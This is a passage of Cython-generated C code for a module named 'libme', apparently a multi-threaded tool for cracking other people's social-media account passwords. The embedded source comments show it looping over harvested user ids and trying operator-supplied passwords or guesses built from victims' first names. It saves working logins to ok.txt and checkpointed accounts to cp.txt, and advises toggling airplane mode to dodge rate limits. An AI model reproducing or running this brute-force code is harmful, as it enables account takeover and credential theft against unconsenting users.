            /* "libme.pyx":1005
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_6 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1005, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 1005, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "libme.pyx":1006
 * 					exit("\n  [!] password minimum 6 characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 1006, __pyx_L18_error)

            /* "libme.pyx":1007
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 1007, __pyx_L18_error)

            /* "libme.pyx":1008
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 1008, __pyx_L18_error)

            /* "libme.pyx":1009
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 */
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1009, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (likely(PyList_CheckExact(__pyx_t_6)) || PyTuple_CheckExact(__pyx_t_6)) {
              __pyx_t_5 = __pyx_t_6; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1009, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1009, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 1009, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1009, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_6 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_6); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 1009, __pyx_L18_error)
                  #else
                  __pyx_t_6 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1009, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  #endif
                }
              } else {
                __pyx_t_6 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_6)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 1009, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_6);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_6);
              __pyx_t_6 = 0;

              /* "libme.pyx":1010
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1010, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1010, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_6))) || (PyList_CheckExact(__pyx_t_6))) {
                PyObject* sequence = __pyx_t_6;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 1010, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_4 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_4 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_4 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1010, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1010, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1010, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_4 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_4)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_4);
                index = 1; __pyx_t_10 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_10)) goto __pyx_L27_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_10);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 1010, __pyx_L18_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L28_unpacking_done;
                __pyx_L27_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 1010, __pyx_L18_error)
                __pyx_L28_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_4);
              __pyx_t_4 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":1011
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))             # <<<<<<<<<<<<<<
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
              __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1011, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_f_james); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1011, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 1011, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_16);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_16, function);
                }
              }
              __pyx_t_9 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_kp_s__12) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_kp_s__12);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1011, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
              __pyx_t_16 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_16)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                  __Pyx_INCREF(__pyx_t_16);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_10, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1011, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_t_4, __pyx_v_uid, __pyx_t_9};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1011, __pyx_L18_error)
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1011, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_16) {
                  __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_t_9);
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1011, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":1009
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":1000
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          goto __pyx_L23_try_end;
          __pyx_L18_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__me__nnn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_10) < 0) __PYX_ERR(0, 1000, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_10); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 1000, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 1000, __pyx_L20_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_13 < 0) __PYX_ERR(0, 1000, __pyx_L20_except_error)
            __pyx_t_19 = ((!(__pyx_t_13 != 0)) != 0);
            if (__pyx_t_19) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_10);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_10 = 0; 
              __PYX_ERR(0, 1000, __pyx_L20_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            goto __pyx_L19_exception_handled;
          }
          __pyx_L20_except_error:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          goto __pyx_L1_error;
          __pyx_L19_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_ExceptionReset(__pyx_t_2, __pyx_t_1, __pyx_t_14);
          __pyx_L23_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 1000, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          goto __pyx_L17;
        }
        __pyx_L17:;
      }
      goto __pyx_L32;
      __pyx_L14_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L32:;
    }

    /* "libme.pyx":999
 * 		print("  [] Total id > \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
    goto __pyx_L13;
  }

  /* "libme.pyx":1012
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  __pyx_t_19 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_t, Py_EQ)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 1012, __pyx_L1_error)
  if (__pyx_t_19) {

    /* "libme.pyx":1013
 * 					coeg.submit(self.__f_james__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1013, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1013, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 1013, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1013, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1013, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1013, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_6 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1013, __pyx_L33_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_1, &__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_10;
            __pyx_t_10 = 0;

            /* "libme.pyx":1014
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 1014, __pyx_L37_error)

            /* "libme.pyx":1015
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 1015, __pyx_L37_error)

            /* "libme.pyx":1016
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 1016, __pyx_L37_error)

            /* "libme.pyx":1017
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1017, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1017, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1017, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 1017, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1017, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 1017, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1017, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 1017, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":1018
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1018, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 1018, __pyx_L37_error)
